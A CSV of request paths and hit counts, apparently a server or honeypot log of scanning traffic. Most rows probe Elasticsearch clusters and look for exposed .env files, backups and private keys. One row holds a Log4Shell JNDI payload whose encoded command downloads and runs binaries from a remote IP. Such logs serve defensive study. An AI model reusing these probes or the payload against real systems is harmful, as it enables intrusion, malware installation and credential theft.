http.url,count
/_all/_search?q=privatekey&size=5,2
/_all/_search?q=privkey&size=5,2
/_all/_stats,1
/_all_dbs,1
/_asterisk/graph.php,30
/_asterisk/phpversions.php,20
/_cat,5
/_cat/aliases?format=json&h=alias,90
/_cat/health?format=json,54
/_cat/indices,334
"/_cat/indices?bytes=b&format=json&h=health,status,index,pri.store.size,docs.count,docs.deleted,store.size,creation.date.string",2
/_cat/indices?format=json,2734
/_cat/indices?format=json&bytes=b,245
"/_cat/indices?format=json&bytes=b&h=health,status,index,pri.store.size,docs.count,docs.deleted,store.size,creation.date.string",54
/_cat/indices?format=json&bytes=mb,3
/_cat/indices?format=json&h=index,93
/_cat/indices?format=json&pretty,13
/_cat/indices?format=text&v=true,5
"/_cat/indices?h=index,docs.count&bytes=mb&format=json",4
/_cat/indices?v,126
/_cat/indices?v&format=json,23
/_cat/indices?v=true,26
/_cat/nodes?format=json,106
/_cluster/health,9
/_cluster/health?level=indices,180
/_cluster/health?pretty,316
"/_cluster/state/nodes,routing_table",19
/_cluster/stats,717
/_count,1
/_mapping,7
/_nodes,748
/_nodes/_local,62
/_profiler/phpinfo,8
/_search,482
/_search?a=${jndi:ldap://81.70.97.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMTAzLjE3OC41Ny4yMzQ6NTQ1MC9sbDY0O2NobW9kIDc3NyBsbDY0Oy4vbGw2NDtybSAtciBsbDY0O3dnZXQgaHR0cDovLzEwMy4xNzguNTcuMjM0OjU0NTAvbGw4NjtjaG1vZCA3NzcgbGw4NjsuL2xsODY7cm0gLXIgbGw4Ng==},3
/_security/user,40
/_stats,84
/_stats/indices,175
/_stats/store/?pretty&human&level=cluster,106
/_stats?pretty,3
/_status,175
/a2billing/admin/Public/graph.php,9
/a2billing/admin/Public/index.php,8
/a2billing/admin/Public/phpversions.php,7
/aaa9,177
/aab8,147
/aab9,37
/about,1
/access/set?param=enableapi&value=1,5
/admin/.env,3
/admin/assets/js/views/login.js,18
/admin/config.php,15
/admin/i18n/readme.txt,7
/admin/index.html,8
/admin/modules/core/ajax.php,8
/admin/modules/core/graph.php,16
/admin/views/config.php,9
/admin/views/graph.php,20
/agc/css/custom.css,1
/api,1
/api/.env,8
/api/env,3
/api/geojson?url=file:///etc/hosts,6
/api/shared/config/config.env,4
/api/v1/markdown/link:metadata?link=http://localhost:13042,5
/app/.env,3
/apps/.env,3
/assets,11
/assets/graph.php,20
/assets/phpversions.php,22
/axis2-admin/,2
/axis2/,2
/axis2/axis2-admin/,2
/backend/.env,3
/backup.7z,5
/backup.gz,5
/backup.rar,5
/backup.tar,5
/backup.tar.gz,5
/backup.zip,5
/bin.7z,5
/bin.gz,5
/bin.rar,5
/bin.tar,5
/bin.tar.gz,5
/bin.zip,5
/bin/bin.7z,5
/bin/bin.gz,5
/bin/bin.rar,5
/bin/bin.tar,5
